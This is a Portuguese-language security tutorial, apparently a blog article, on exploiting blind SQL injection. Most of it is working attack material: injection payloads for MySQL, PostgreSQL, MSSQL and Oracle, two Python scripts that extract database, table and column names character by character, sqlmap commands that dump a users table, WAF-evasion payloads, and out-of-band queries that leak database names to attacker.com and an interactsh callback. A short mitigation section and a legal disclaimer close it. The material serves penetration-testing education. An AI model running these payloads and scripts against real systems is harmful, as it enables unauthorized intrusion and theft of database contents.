---
title: "Blind SQL Injection — Extraindo dados sem ver o output"
date: 2025-02-10
description: "Técnicas de exploração de Blind SQL Injection (boolean-based e time-based) para extração de dados quando a aplicação não retorna erros visíveis."
category: web
os: [linux, windows]
difficulty: hard
mitre_tactic: TA0006
mitre_technique: T1190
tags: [sqli, blind, web, database, boolean-based, time-based, sqlmap]
status: published
readingTime: 12
---

## O que é Blind SQL Injection?

**Blind SQL Injection** ocorre quando uma aplicação é vulnerável a SQL Injection, mas **não retorna os resultados da query** nem mensagens de erro na resposta HTTP. O atacante precisa inferir o conteúdo do banco de dados com base em comportamentos indiretos da aplicação.

Existem dois tipos principais:

| Tipo | Mecanismo | Velocidade |
|------|-----------|------------|
| Boolean-based | Avalia TRUE/FALSE na resposta | Lenta |
| Time-based | Mede atraso na resposta (SLEEP) | Muito lenta |
| Error-based | Provoca erros com dados embutidos | Rápida |
| Out-of-band | Exfiltração via DNS/HTTP | Rápida |

---

## Identificando a vulnerabilidade

### Teste básico de injeção

```http
GET /user?id=1 HTTP/1.1
Host: target.com
```

Injete condições booleanas e observe diferenças de resposta:

```
# Condição TRUE — resposta normal
/user?id=1 AND 1=1--

# Condição FALSE — resposta diferente (sem conteúdo, redirect, etc.)
/user?id=1 AND 1=2--
```

Se as respostas forem **visivelmente diferentes** entre TRUE e FALSE, o endpoint é vulnerável a boolean-based blind SQLi.

### Teste time-based

```
# MySQL / MariaDB
/user?id=1 AND SLEEP(5)--

# PostgreSQL
/user?id=1 AND pg_sleep(5)--

# MSSQL
/user?id=1; WAITFOR DELAY '0:0:5'--

# Oracle
/user?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

Se a resposta demorar exatamente **5 segundos**, o backend é vulnerável.

---

## Boolean-Based Exploitation (Manual)

A técnica consiste em fazer perguntas de **sim/não** ao banco de dados, extraindo um caractere por vez.

### Identificando o banco de dados

```sql
-- MySQL
1 AND SUBSTRING(@@version,1,1)='5'--

-- PostgreSQL
1 AND SUBSTRING(version(),1,10)='PostgreSQL'--

-- MSSQL
1 AND SUBSTRING(@@version,1,9)='Microsoft'--
```

### Extraindo o nome do banco atual

```sql
-- Tamanho do nome
1 AND LENGTH(database())=6--

-- Primeiro caractere
1 AND SUBSTRING(database(),1,1)='d'--

-- Segundo caractere
1 AND SUBSTRING(database(),2,1)='v'--
```

### Script Python para automação boolean-based

```python
#!/usr/bin/env python3
# blind_sqli_extract.py — Boolean-based extractor

import requests
import string
import sys

TARGET = "http://target.com/user"
PARAM  = "id"
CHARS  = string.ascii_lowercase + string.digits + "_-@."

def inject(payload: str) -> bool:
    """Returns True if the injection condition is TRUE."""
    params = {PARAM: f"1 AND ({payload})-- -"}
    r = requests.get(TARGET, params=params, timeout=10)
    # Adjust the marker to whatever differentiates TRUE from FALSE
    return "Welcome" in r.text

def extract_string(query: str, max_len: int = 64) -> str:
    """Extract a string value one character at a time."""
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for ch in CHARS:
            payload = f"SUBSTRING(({query}),{pos},1)='{ch}'"
            if inject(payload):
                result += ch
                sys.stdout.write(ch)
                sys.stdout.flush()
                found = True
                break
        if not found:
            break  # End of string
    print()
    return result

if __name__ == "__main__":
    print("[*] Extracting database name...")
    db = extract_string("SELECT database()")
    print(f"[+] Database: {db}")

    print("[*] Extracting first table name...")
    table = extract_string(
        f"SELECT table_name FROM information_schema.tables "
        f"WHERE table_schema='{db}' LIMIT 1"
    )
    print(f"[+] First table: {table}")

    print("[*] Extracting columns...")
    cols = extract_string(
        f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns "
        f"WHERE table_name='{table}'"
    )
    print(f"[+] Columns: {cols}")
```

---

## Time-Based Exploitation (Manual)

Quando não há diferença visual na resposta, use atrasos de tempo como canal de informação.

```python
#!/usr/bin/env python3
# time_based_sqli.py — Time-based extractor

import requests
import string
import time
import sys

TARGET    = "http://target.com/user"
PARAM     = "id"
DELAY     = 3      # seconds to sleep if TRUE
THRESHOLD = 2.5    # detection threshold
CHARS     = string.ascii_lowercase + string.digits + "_-@."

def inject_time(payload: str) -> bool:
    """Returns True if the response took longer than THRESHOLD."""
    full = f"1 AND IF(({payload}), SLEEP({DELAY}), 0)-- -"
    params = {PARAM: full}
    start = time.time()
    try:
        requests.get(TARGET, params=params, timeout=DELAY + 5)
    except requests.exceptions.Timeout:
        return True
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

def extract_string(query: str, max_len: int = 64) -> str:
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for ch in CHARS:
            payload = f"SUBSTRING(({query}),{pos},1)='{ch}'"
            if inject_time(payload):
                result += ch
                sys.stdout.write(ch)
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
    print()
    return result

if __name__ == "__main__":
    print("[*] Time-based extraction — this will be slow...")
    db = extract_string("SELECT database()")
    print(f"[+] Database: {db}")
```

> **NOTA:** Time-based SQLi é extremamente lento para strings longas. Use binary search (ascii range) para otimizar.

### Otimização com Binary Search

```python
def extract_char_binary(query: str, pos: int) -> str:
    """Extract a single character using binary search on ASCII value."""
    lo, hi = 32, 126  # printable ASCII range
    while lo < hi:
        mid = (lo + hi) // 2
        payload = f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"
        if inject_time(payload):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if 32 <= lo <= 126 else ''
```

---

## Usando sqlmap

Para automação profissional, o **sqlmap** é a ferramenta padrão.

```bash
# Detecção básica
sqlmap -u "http://target.com/user?id=1" --batch

# Forçar técnicas específicas
sqlmap -u "http://target.com/user?id=1" \
  --technique=BT \
  --batch \
  --level=3 \
  --risk=2

# Extrair banco, tabelas e dump
sqlmap -u "http://target.com/user?id=1" \
  --dbs \
  --batch

sqlmap -u "http://target.com/user?id=1" \
  -D target_db \
  --tables \
  --batch

sqlmap -u "http://target.com/user?id=1" \
  -D target_db \
  -T users \
  --dump \
  --batch

# Via POST request
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" \
  -p username \
  --batch

# Via Burp intercepted request
sqlmap -r request.txt --batch --level=5

# Com cookie de sessão autenticado
sqlmap -u "http://target.com/profile?id=1" \
  --cookie="session=abc123; csrftoken=xyz" \
  --batch
```

### sqlmap com proxy (Burp Suite)

```bash
sqlmap -u "http://target.com/user?id=1" \
  --proxy="http://127.0.0.1:8080" \
  --batch \
  --tamper=space2comment,randomcase
```

---

## Bypass de WAF

### Tamper scripts úteis do sqlmap

```bash
# Espaço → comentário SQL
--tamper=space2comment

# Case aleatório: SELECT → SeLeCt
--tamper=randomcase

# Encode URL dos payloads
--tamper=percentage

# Combinar múltiplos tampers
--tamper=space2comment,randomcase,between
```

### Payloads ofuscados manualmente

```sql
-- Espaços substituídos por comentários
1/**/AND/**/1=1--

-- Inline comments para separar keywords
1 /*!AND*/ 1=1--

-- Hex encoding de strings
1 AND SUBSTRING(database(),1,1)=0x64--

-- Double URL encoding (para WAFs que decodificam uma vez)
%2527  →  %27  →  '
```

---

## Out-of-Band (OOB) Exfiltration

Quando ambos boolean e time-based estão bloqueados, exfiltre via DNS ou HTTP.

### MySQL — DNS Exfiltration

```sql
-- Exige FILE privilege e resolução DNS externa
SELECT LOAD_FILE(CONCAT('\\\\',
  (SELECT database()),
  '.attacker.com\\share'))--
```

### MSSQL — xp_dirtree DNS

```sql
-- Via xp_dirtree (não precisa de xp_cmdshell)
EXEC master.dbo.xp_dirtree
  '\\' + (SELECT TOP 1 table_name FROM information_schema.tables) + '.attacker.com\x'--
```

### Capturando com interactsh ou Burp Collaborator

```bash
# Iniciar listener com interactsh-client
interactsh-client -v

# Sua URL de callback fica em: xxxx.interactsh.com
# Use no payload:
# ' AND LOAD_FILE(CONCAT('\\\\', database(), '.xxxx.interactsh.com\\x'))--
```

---

## Mitigação

| Vetor | Controle Recomendado |
|-------|----------------------|
| Query dinâmica | Usar **Prepared Statements** / Parameterized Queries |
| ORM inseguro | Evitar raw queries; usar ORMs com bind parameters |
| Erros verbosos | Desabilitar stack traces em produção |
| Ausência de WAF | Implementar WAF com regras OWASP CRS |
| Permissões excessivas | DB user deve ter apenas SELECT nas tabelas necessárias |
| OOB via DNS | Bloquear resolução DNS de saída no servidor DB |

```python
# SEGURO: Parameterized query em Python (psycopg2)
import psycopg2

conn = psycopg2.connect("dbname=app user=readonly")
cur  = conn.cursor()

user_id = request.args.get("id")
cur.execute("SELECT username FROM users WHERE id = %s", (user_id,))
row = cur.fetchone()
```

---

## Referências

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [sqlmap documentation](https://sqlmap.org/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/blind)

> **AVISO LEGAL:** Este conteúdo é destinado exclusivamente a profissionais de segurança autorizados. O uso destas técnicas em sistemas sem autorização explícita é ilegal. KBM Security não se responsabiliza pelo uso indevido.